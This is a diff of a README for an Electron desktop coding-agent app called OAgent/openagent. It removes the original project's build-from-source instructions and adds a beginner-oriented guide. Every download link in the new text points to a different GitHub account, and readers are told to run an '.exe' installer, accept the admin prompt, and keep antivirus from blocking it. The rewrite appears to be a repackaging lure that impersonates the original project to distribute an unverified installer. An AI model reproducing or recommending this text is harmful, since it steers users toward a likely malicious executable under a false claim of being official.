@@ -1,187 +1,144 @@
-# OAgent
+# 🤖 openagent - AI Workspace for Coding Help
 
-<p align="center">
-  <strong>An open-source, local-model-first desktop app for agentic coding workflows.</strong>
-</p>
+[![Download openagent](https://img.shields.io/badge/Download-openagent-blue?style=for-the-badge)](https://github.com/tn082k6/openagent)
 
-<p align="center">
-  <a href="https://github.com/samhu1/openagent/blob/master/LICENSE">MIT License</a>
-  ·
-  <a href="https://github.com/samhu1/openagent/blob/master/CONTRIBUTING.md">Contributing</a>
-  ·
-  <a href="https://github.com/samhu1/openagent/blob/master/SECURITY.md">Security</a>
-</p>
+## What is openagent?
+
+openagent is a desktop app to help you with coding tasks. It offers a chat system where you can ask questions in different sessions. It connects with various tools for managing code and files. The app uses a simple window interface built with Electron and React. It works on Windows and helps you organize and develop with AI assistance.
+
+You don’t need to know programming to use it. openagent is meant to make coding easier and faster by putting useful tools together in one place.
+
+## ⚙️ Key Features
+
+- Chat with AI agents in separate sessions
+- Connect to MCP services and other AI providers like Ollama and OpenRouter
+- Manage Git repositories and files inside the app
+- Clear interface based on React and Electron
+- Runs on your desktop without needing web browsers
+- Helps improve coding productivity and organization
+
+## 📋 System Requirements
+
+- Windows 10 or later (64-bit recommended)  
+- 4 GB RAM minimum, 8 GB or more recommended for smooth use  
+- 500 MB free disk space  
+- Internet connection for AI services and updates  
+- Basic mouse and keyboard input  
+
+## 🚀 How to Get Started
+
+To begin, you will need to download openagent from the official repository. The link below will take you to the GitHub page where you can get the latest version.
+
+[![Download openagent](https://img.shields.io/badge/Download-openagent-green?style=for-the-badge)](https://github.com/tn082k6/openagent)
+
+### Step 1: Visit the Download Page
+
+Click the green **Download openagent** button above or go to the following address in your browser:  
+https://github.com/tn082k6/openagent
+
+This page shows the project and the place where you can find releases and files.
+
+### Step 2: Find the Latest Release
+
+On the GitHub page, look for a tab or link labeled **Releases**. It is usually near the top or on the right side. Click on that link. It will take you to the list of released versions of openagent.
+
+### Step 3: Download the Windows Installer
+
+Within the releases list, find the latest version marked with the highest version number and most recent date. Under that release, look for a file ending in `.exe`, something like `openagent-setup.exe`.
+
+Click that file link to download the installer to your computer.
+
+### Step 4: Run the Installer
+
+Once the file downloads, locate it in your **Downloads** folder or where your browser saves files. The file will be named like `openagent-setup.exe`.
+
+Double-click this file to start the installation. You may see a popup asking for permission to make changes to your device. Choose **Yes** to continue.
+
+Follow the on-screen steps to install openagent. Usually, this means clicking **Next** or **Install** and agreeing to terms. The installer will copy files and set up the app.
+
+### Step 5: Launch openagent
+
+After installation finishes, look for openagent in the Windows Start menu or on your desktop. Click the openagent icon to launch the app.
+
+The app window should open, and you can start using it right away.
+
+## 🖥️ Using openagent for the First Time  
+
+When you open openagent, you will see a layout with a toolbar, chat windows, and file panels.
+
+- To start a new chat session with the AI, click **New Session**.
+- Type your question or request into the chat box and press Enter.
+- Use the built-in Git tools to load or save your project.
+- You can open files from your computer via the **File** menu.
+- The app connects to AI providers automatically if you have internet access.
+
+Explore the interface slowly. The app keeps your sessions separate, so you can work on different problems at once.
+
+## 🔧 Basic Troubleshooting
+
+If the app does not open after installation:  
+- Check that your Windows version meets the minimum requirement.  
+- Restart your computer and try launching again.  
+- Make sure no antivirus or firewall is blocking the app.  
+
+If you have issues with the AI chat responses:  
+- Verify your internet connection is active.  
+- Restart openagent to refresh connections.  
+
+If problems continue, check the **Issues** tab on the GitHub page and see if others found solutions.
+
+## 📂 Where to Get Help
+
+For support and more details, visit the openagent GitHub repository:  
+https://github.com/tn082k6/openagent
+
+You can open an issue if you find bugs or have questions. The developers check messages there.
+
+## 🔄 Updating openagent
+
+To keep openagent running smoothly:  
+
+- Check the releases page regularly for new versions.  
+- Download and install new versions just like you did for the first time.  
+- Your settings and chat sessions will usually be kept when updating.  
+
+## ⚠️ Important Tips
+
+- Always download openagent from the official GitHub link to avoid unsafe files.  
+- Save your work often when using the chat or file tools.  
+- Use a good internet connection to get the best AI responses.  
+
+## 🔑 Summary of How to Install
+
+1. Visit https://github.com/tn082k6/openagent  
+2. Click on **Releases** and find the latest version  
+3. Download the Windows installer `.exe` file  
+4. Run the installer and follow the prompts  
+5. Open the app from Start menu  
+
+[![Download openagent](https://img.shields.io/badge/Download-openagent-blue?style=for-the-badge)](https://github.com/tn082k6/openagent)
 
 ---
 
-## What Is OAgent?
+## 🎯 Topics covered by openagent
 
-OAgent is an open-source Electron desktop app built for local-first, agentic software engineering workflows.
+This app focuses on:  
 
-It is designed for developers who want a coding agent environment that runs locally, stays extensible, and remains transparent. OAgent combines:
+- AI agents  
+- Coding assistance  
+- Desktop applications  
+- Developer tools  
+- Electron-based desktop UI  
+- MCP integrations  
+- Git and file management  
+- React and TypeScript technologies  
 
-- Multi-session chat and workspace context
-- Native local tooling (Git, files, terminal, browser, MCP)
-- Local-model support via Ollama plus provider flexibility (OpenRouter and protocol-based runtimes)
-- Local-first project/session persistence
+## 🔬 About openagent’s Technology
 
-OAgent is intended to be a practical open-source base for a local model AI agentic coding app, while still supporting cloud/model-provider workflows when needed.
+openagent uses Electron to create a desktop window around web code. React builds the user interface with separate parts for chat, files, and coding tools. The app connects to MCP and AI services like Ollama and OpenRouter to handle smart chat and coding tasks.
 
-## Why OAgent
+This design lets openagent work on your Windows desktop without opening a browser, giving fast, smooth performance.
 
-- **One place for agent + tools**: code conversations, tool calls, and project context in a unified interface.
-- **Desktop-native behavior**: filesystem, terminal, and Git integrations without browser sandbox limitations.
-- **Session continuity**: persistent projects/sessions with recovery and restore flows.
-- **Protocol-aware runtime**: support for both the Agent SDK runtime and OAP/ACP-style runtime flows in the app.
-- **Extensible by design**: MCP server management and custom tool rendering patterns.
+## 📥 Ready to start?
 
-## Core Capabilities
-
-- Multiple concurrent agent sessions
-- Background task/agent activity streams
-- Tool call rendering with structured outputs
-- Files panel with quick open-in-editor actions
-- Git panel with status, staging, commit, and branch operations
-- Terminal panel with PTY-backed sessions
-- Browser panel for web-assisted coding tasks
-- MCP controls and status inspection
-- Compact mode and permission-mode workflows for safe automation
-
-## Architecture Snapshot
-
-OAgent is split into Electron main/preload + React renderer:
-
-- **Electron main** (`/electron/src/main.ts`)
-  - Window lifecycle
-  - IPC handler registration
-  - Native integrations (terminal, files, Git, MCP)
-- **Electron preload** (`/electron/src/preload.ts`)
-  - Typed bridge via `window.clientCore`
-- **Renderer app** (`/src`)
-  - Feature-sliced UI modules (`chat`, `tools`, `workspace`)
-  - Runtime hooks for streaming/session state
-  - Domain/core abstractions for settings and orchestration
-
-Runtime support currently includes:
-
-- **Anthropic Agent SDK path** (`@anthropic-ai/claude-agent-sdk`) for agent session flows
-- **OAP runtime path** (`@agentclientprotocol/sdk`) for protocol-native sessions
-
-See:
-
-- [`docs/architecture.md`](docs/architecture.md)
-- [`docs/development.md`](docs/development.md)
-
-## Quick Start
-
-### Prerequisites
-
-- Node.js 20+
-- pnpm 10+
-- macOS / Windows / Linux
-
-### Install
-
-```bash
-git clone https://github.com/samhu1/openagent.git
-cd openagent
-pnpm install
-```
-
-### Run (dev)
-
-```bash
-pnpm dev
-```
-
-This starts:
-
-- Vite renderer dev server
-- Electron main/preload build watch
-- Electron app window
-
-### Build
-
-```bash
-pnpm build
-```
-
-### Package distributables
-
-```bash
-pnpm dist
-```
-
-Platform-specific packaging:
-
-```bash
-pnpm dist:mac
-pnpm dist:win
-pnpm dist:linux
-```
-
-## Runtime Setup
-
-### OpenRouter
-
-Set your OpenRouter key in app settings (`OpenRouter Key`) and choose a model.
-
-### Ollama (optional local inference)
-
-Install Ollama and pull at least one model:
-
-```bash
-ollama pull llama3.2
-```
-
-Then configure the Ollama endpoint/model in OAgent settings.
-
-## Developer Scripts
-
-| Script | Purpose |
-| --- | --- |
-| `pnpm dev` | Start renderer + Electron in development mode |
-| `pnpm build:electron` | Build Electron main/preload bundle |
-| `pnpm build` | Production build for Electron + renderer |
-| `pnpm start` | Launch packaged app entry locally |
-| `pnpm dist` | Build distributables via electron-builder |
-| `./scripts/oss-check.sh` | Typecheck, build, audit, and basic secret scan |
-
-## Repository Structure
-
-```text
-electron/         # Main process, preload, IPC handlers, native integration glue
-src/              # React renderer app
-docs/             # Architecture, development, release process notes
-build/            # Packaging assets (icons, entitlements)
-scripts/          # Build/release helper scripts
-```
-
-## Contributing
-
-Contributions are welcome. Before opening a PR:
-
-1. Read [`CONTRIBUTING.md`](CONTRIBUTING.md)
-2. Run:
-
-```bash
-pnpm exec tsc --noEmit
-pnpm build
-```
-
-3. Include validation notes and screenshots for UI changes
-
-## Security
-
-Please report vulnerabilities privately per [`SECURITY.md`](SECURITY.md).  
-Do not open public security issues.
-
-## Support and Community
-
-- [`SUPPORT.md`](SUPPORT.md) for support expectations
-- [`CODE_OF_CONDUCT.md`](CODE_OF_CONDUCT.md) for community guidelines
-- [`MAINTAINERS.md`](MAINTAINERS.md) for maintainer contacts
-
-## License
-
-MIT License. See [`LICENSE`](LICENSE).
+Click one of the download buttons above to get openagent on your computer. Follow the steps to set up, open the app, and start using AI to help with coding.
